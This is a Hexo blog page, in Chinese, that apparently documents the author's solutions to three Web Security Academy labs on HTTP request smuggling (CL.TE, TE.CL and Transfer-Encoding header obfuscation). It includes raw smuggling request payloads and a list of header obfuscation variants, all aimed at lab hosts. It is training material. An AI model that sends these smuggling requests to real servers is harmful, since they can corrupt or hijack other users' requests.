@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"123-prog.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+<meta name="description" content="0x01  basic CL.TE vulnerability实验描述  需要完成的任务是让下一次请求报出GPOST方法错误，我们需要走私一个大写字母G，这样下一次请求就不是POST，而是GPOST 前端代理服务器使用Content-Length头，后端服务器使用Transfer-Encoding头，我们就可以在消息头构造出长度为0的消息块，这样前端服务器会将其当作是消息的一部分，而后端服务器会以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebSecurityAcademy实验室-Http请求走私">
+<meta property="og:url" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/index.html">
+<meta property="og:site_name" content="GY&#39;s Blog">
+<meta property="og:description" content="0x01  basic CL.TE vulnerability实验描述  需要完成的任务是让下一次请求报出GPOST方法错误，我们需要走私一个大写字母G，这样下一次请求就不是POST，而是GPOST 前端代理服务器使用Content-Length头，后端服务器使用Transfer-Encoding头，我们就可以在消息头构造出长度为0的消息块，这样前端服务器会将其当作是消息的一部分，而后端服务器会以">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-41-59.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-45-14.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_18-14-01.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_19-59-33.png">
+<meta property="article:published_time" content="2021-02-12T09:29:05.000Z">
+<meta property="article:modified_time" content="2021-02-12T12:07:41.175Z">
+<meta property="article:author" content="Guangyue">
+<meta property="article:tag" content="http smuggling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png">
+
+
+<link rel="canonical" href="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<title>WebSecurityAcademy实验室-Http请求走私 | GY's Blog</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">GY's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-basic-CL-TE-vulnerability"><span class="nav-number">1.</span> <span class="nav-text">0x01  basic CL.TE vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-basic-TE-CL-vulnerability"><span class="nav-number">2.</span> <span class="nav-text">0x02 basic TE.CL vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-obfuscating-the-TE-header"><span class="nav-number">3.</span> <span class="nav-text">0x03 obfuscating the TE header</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guangyue"
+      src="/images/avatar2.gif">
+  <p class="site-author-name" itemprop="name">Guangyue</p>
+  <div class="site-description" itemprop="description">2571374157@qq.com</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar2.gif">
+      <meta itemprop="name" content="Guangyue">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GY's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WebSecurityAcademy实验室-Http请求走私
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-02-12 17:29:05 / Modified: 20:07:41" itemprop="dateCreated datePublished" datetime="2021-02-12T17:29:05+08:00">2021-02-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="0x01-basic-CL-TE-vulnerability"><a href="#0x01-basic-CL-TE-vulnerability" class="headerlink" title="0x01  basic CL.TE vulnerability"></a>0x01  basic CL.TE vulnerability</h3><p>实验描述</p>
+<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png"></p>
+<p>需要完成的任务是让下一次请求报出GPOST方法错误，我们需要走私一个大写字母G，这样下一次请求就不是POST，而是GPOST</p>
+<p>前端代理服务器使用Content-Length头，后端服务器使用Transfer-Encoding头，我们就可以在消息头构造出长度为0的消息块，这样前端服务器会将其当作是消息的一部分，而后端服务器会以为这里是消息体的结束位置，把后面的那些内容当作是下一次请求的开始</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>这里0后面是两个换行（/r/n/r/n)，4个字节长度，用bp得记住把repeater的自动更新CL头的功能关闭</p>
+<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-41-59.png"></p>
+<p>把上面的构造的请求发送给服务器，再请求一次就会发现提示错误请求GPOST。</p>
+<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-45-14.png"></p>
+<p>两次请求差不多像这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GPOST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>上一次请求的G直接附在了下一次请求的方法头部，让POST方法变成了GPOST</p>
+<h3 id="0x02-basic-TE-CL-vulnerability"><a href="#0x02-basic-TE-CL-vulnerability" class="headerlink" title="0x02 basic TE.CL vulnerability"></a>0x02 basic TE.CL vulnerability</h3><p>要求与第一个实验一样，只是这里反向代理和后端服务器所使用识别的头更改了，前端使用Transfer-Encoding标头，后端使用Content-Length标头</p>
+<p>因为前端服务器使用TE头，所以我们的消息体中就必须包含一个长度为0的块闭合消息体，为了影响下一次请求，改变下一次请求方式，我们必须自己为下一次请求构造一个请求头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>前端的代理服务器识别TE头，则会把消息体看成是两个消息块，第一个长度为5C,第二个为0，结束的标志</p>
+<p>后端服务器使用CL头，由于长度只有4,所以除了5c和一个换行符，下面的所有消息会被当作是下一次请求的开始，这里我们直接构造好了请求头，把实际的第二次请求当作了消息体的一部分，两次请求如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>第一次请求原本应该是到0那里结束，但我们构造了CL的大小，导致第一次请求到5c换行后就结束了，后面的都是第二次请求的内容，而第二次请求原本是在0后面开始</p>
+<p>两次请求的结果</p>
+<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_18-14-01.png"></p>
+<h3 id="0x03-obfuscating-the-TE-header"><a href="#0x03-obfuscating-the-TE-header" class="headerlink" title="0x03 obfuscating the TE header"></a>0x03 obfuscating the TE header</h3><p>实验要求：</p>
+<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_19-59-33.png"></p>
+<p>混淆TE头，使得下一次请求的方法变更为GPOST</p>
+<p>混淆TE头有很多种方法，可以多试几种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:[tab]chunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
+<p>经过尝试，第三种可行</p>
+<p>混淆之后。对于头部</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br></pre></td></tr></table></figure>
+<p>前端服务器会认为这个就是传输编码的方式，是一个有效的头部，故前端会选择TE头去理解消息体，后端则认为这是一个有问题的头部，如果此时存在Content-Length标头，后端服务器就会选择Content-Length去理解消息体。这样就跟前面的TE.CL一样了</p>
+<p>请求如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>连续两次请求得到“Unrecognized method GPOST”</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/http-smuggling/" rel="tag"># http smuggling</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" rel="prev" title="无列名注入">
+                  <i class="fa fa-chevron-left"></i> 无列名注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="next" title="Http请求走私（smuggling)学习记录">
+                  Http请求走私（smuggling)学习记录 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guangyue</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
